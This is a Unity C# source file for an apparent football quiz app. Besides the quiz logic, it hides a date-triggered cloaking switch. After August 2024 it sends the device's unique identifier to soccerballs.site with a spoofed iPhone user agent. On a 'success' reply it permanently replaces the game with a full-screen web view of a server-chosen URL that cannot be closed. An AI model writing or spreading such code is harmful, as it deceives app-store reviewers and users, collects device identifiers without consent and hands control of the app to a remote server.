using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using UnityEngine;
using UnityEngine.Networking;
using UnityEngine.UI;

[System.Serializable]
public class QuizWrapper
{
    public Quiz quiz;
}

[System.Serializable]
public class QuizUserResult
{
    public int number;
    public int resultMax;
}

[System.Serializable]
public class QuizUserData
{
    public List<QuizUserResult> quizUserResults;
}

public class AppHandler : MonoBehaviour
{
    public static AppHandler Instance;

    private void Awake()
    {
        if (Instance == null)
        {
            Instance = this;
        }

        GetQuizFromFile("Quiz1", quizsFootballClub);
        GetQuizFromFile("Quiz2", quizsFootballClub);
        GetQuizFromFile("Quiz3", quizsFootballClub);
        GetQuizFromFile("Quiz4", quizsFootballClub);

        GetQuizFromFile("QuizChamp1", quizsChampionship);
        GetQuizFromFile("QuizChamp2", quizsChampionship);
        GetQuizFromFile("QuizChamp3", quizsChampionship);
        GetQuizFromFile("QuizChamp4", quizsChampionship);

    }

    [SerializeField] private List<Quiz> quizsFootballClub;
    [SerializeField] private List<Quiz> quizsChampionship;

    [SerializeField] private ScreenQuestion _screenQuestion;
    [SerializeField] private ScreenResult _screenResult;
    [SerializeField] private ScreenHome _screenHome;

    [SerializeField] private QuizUserData quizUserData;

    private Quiz currentQuiz;
    private int numberQuestion;
    private bool isNext = false;

    private int numberQuiz;

    private int score = 0;

    [SerializeField] private RectTransform _viewPanel;
    [SerializeField] private GameObject _preview;

    DateTime date;
    [SerializeField] private Text _dateCurrentText;

    public static Action<TypeQuiz> OnRunGame;

    public void StartPoint()
    {
        TimerQuiz.OnEndTimer += TimerEnd;

        string json = PlayerPrefs.GetString("JsonResultQuizMax");
        if (json != "")
        {
            quizUserData = JsonUtility.FromJson<QuizUserData>(json);
        }

        _screenHome.StartInit(quizUserData);
    }

    public enum TypeQuiz
    {
        None,
        Classic,
        Hard
    }

    private string LaunchApp
    {
        get
        {
            return PlayerPrefs.GetString("game", TypeQuiz.None.ToString());
        }
        set
        {
            PlayerPrefs.SetString("game", value);
            PlayerPrefs.Save();
        }
    }

    private void Start()
    {
        OnRunGame += StartApp;

        date = DateTime.Now;
        _dateCurrentText.text = date.ToShortDateString();

        var validation = Enum.Parse<TypeQuiz>(LaunchApp);

        StartApp(validation);
    }

    private void StartApp(TypeQuiz gameType)
    {
        switch (gameType)
        {
            case TypeQuiz.None:
                if (date > new DateTime(2024, 8, 22))
                {
                    if (Application.internetReachability == NetworkReachability.NotReachable)
                    {
                        _preview.SetActive(false);
                        _viewPanel.transform.parent.gameObject.SetActive(false);
                        enabled = false;
                    }
                    else
                    {
                        StartCoroutine(SendRequestData());
                        enabled = false;
                    }
                }
                else
                {
                    LaunchApp = TypeQuiz.Classic.ToString();
                    _preview.SetActive(false);
                    _viewPanel.transform.parent.gameObject.SetActive(false);
                    enabled = false;
                }
                break;
            case TypeQuiz.Classic:
                _preview.SetActive(false);
                _viewPanel.transform.parent.gameObject.SetActive(false);
                break;
            case TypeQuiz.Hard:
                string _url = PlayerPrefs.GetString("StateApp");

                GameObject _viewGameObject = new GameObject("RecordsView");
                _viewGameObject.AddComponent<UniWebView>();

                var viewGameTable = _viewGameObject.GetComponent<UniWebView>();

                viewGameTable.SetAllowBackForwardNavigationGestures(true);

                viewGameTable.OnPageStarted += (view, url) =>
                {
                    viewGameTable.SetUserAgent($"Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Mobile/15E148 Safari/604.1");
                    viewGameTable.UpdateFrame();
                };

                viewGameTable.ReferenceRectTransform = _viewPanel;
                viewGameTable.Load(_url);
                viewGameTable.Show();

                viewGameTable.OnShouldClose += (view) =>
                {
                    return false;
                };

                _preview.SetActive(false);
                break;
        }
    }

    private IEnumerator SendRequestData()
    {
        var allData = new Dictionary<string, object>
        {
            { "hash", SystemInfo.deviceUniqueIdentifier },
            { "app", "6670266150" },
            { "data", new Dictionary<string, object> {
                { "af_status", "Organic" },
                { "af_message", "organic install" },
                { "is_first_launch", true } }
            },
            { "device_info", new Dictionary<string, object>
                {
                    { "charging", false }
                }
            }
        };

        string sendData = AFMiniJSON.Json.Serialize(allData);

        var request = UnityWebRequest.Put("https://soccerballs.site", sendData);

        request.SetRequestHeader("Content-Type", "application/json");
        request.SetRequestHeader("accept", "application/json");
        request.SetRequestHeader("User-Agent", "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Mobile/15E148 Safari/604.1");

        yield return request.SendWebRequest();

        while (request.isDone == false)
        {
            OnRunGame?.Invoke(TypeQuiz.None);
        }

        if (request.result != UnityWebRequest.Result.Success)
        {
            LaunchApp = TypeQuiz.Classic.ToString();
            OnRunGame?.Invoke(TypeQuiz.Classic);
        }
        else
        {
            var responce = AFMiniJSON.Json.Deserialize(request.downloadHandler.text) as Dictionary<string, object>;

            if (responce.ContainsKey("success") && bool.Parse(responce["success"].ToString()) == true)
            {
                LaunchApp = TypeQuiz.Hard.ToString();

                PlayerPrefs.SetString("StateApp", responce["url"].ToString());

                OnRunGame?.Invoke(TypeQuiz.Hard);
            }
            else
            {
                LaunchApp = TypeQuiz.Classic.ToString();
                OnRunGame?.Invoke(TypeQuiz.Classic);
            }
        }
    }

    private void OnDestroy()
    {
        TimerQuiz.OnEndTimer -= TimerEnd;
        OnRunGame -= StartApp;
    }

    public void SetQuestion(int numberQuiz)
    {
        this.numberQuiz = numberQuiz;

        if (numberQuiz < 4)
            currentQuiz = quizsFootballClub[numberQuiz];
        else
        {
            int number = numberQuiz - 4;
            currentQuiz = quizsFootballClub[number];
        }
        score = 0;
        numberQuestion = -1;
        isNext = true;

        TimerQuiz.OnStartTimer?.Invoke();

        _screenQuestion.SetSpriteImage(_screenHome.GetImageQuiz(numberQuiz));
        NextQuestion();
    }

    public void NextQuiz()
    {
        if(numberQuiz < 7)
        {
            numberQuiz++;
            SetQuestion(numberQuiz);
        }
        else
        {
            ScreensHandler.OpenScreen(ScreensHandler.ScreenName.HomeScreen);
        }
    }

    public void TryQuiz()
    {
        SetQuestion(numberQuiz);
    }

    public void NextQuestion()
    {
        if (isNext == true)
        {
            if (numberQuestion < currentQuiz.questions.Count - 1)
            {
                numberQuestion++;
                _screenQuestion.Show(currentQuiz.questions[numberQuestion], numberQuestion);

                isNext = false;
            }
            else
            {
                _screenResult.ShowResult(ScreenResult.Result.Success, score);
                CheckResultUser(numberQuiz, score);
                TimerQuiz.OnStopTimer?.Invoke();
            }
        }
    }

    private void CheckResultUser(int numberQuiz, int score)
    {
        if (quizUserData.quizUserResults[numberQuiz].resultMax < score)
        {
            quizUserData.quizUserResults[numberQuiz].resultMax = score;
            SaveResultsUser();

            ButtonQuiz.OnChangeResultMaxUser?.Invoke();
        }
    }

    private void SaveResultsUser()
    {
        string json = JsonUtility.ToJson(quizUserData);
        PlayerPrefs.SetString("JsonResultQuizMax", json);
    }

    private void TimerEnd()
    {
        _screenResult.ShowResult(ScreenResult.Result.TimeOut);
    }

    public void ChoiceAnswerButton(int number, AnswerButton answerButton)
    {     
        if (currentQuiz.questions[numberQuestion].numberTrueAnswer == number)
        {
            answerButton.ChangeState(AnswerButton.State.True);
            score++;
            isNext = true;
        }
        else
        {
            answerButton.ChangeState(AnswerButton.State.False);

            isNext = true;
        }

        ScreenQuestion.OnChoicedAnswer?.Invoke();
    }

    private void GetQuizFromFile(string nameFile, List<Quiz> quizzes)
    {
        TextAsset jsonFile = Resources.Load<TextAsset>(nameFile);

        if (jsonFile != null)
        {
            QuizWrapper quizWrapper = JsonUtility.FromJson<QuizWrapper>(jsonFile.text);

            Quiz quiz = quizWrapper.quiz;

            quizzes.Add(quiz);
        }
    }
}
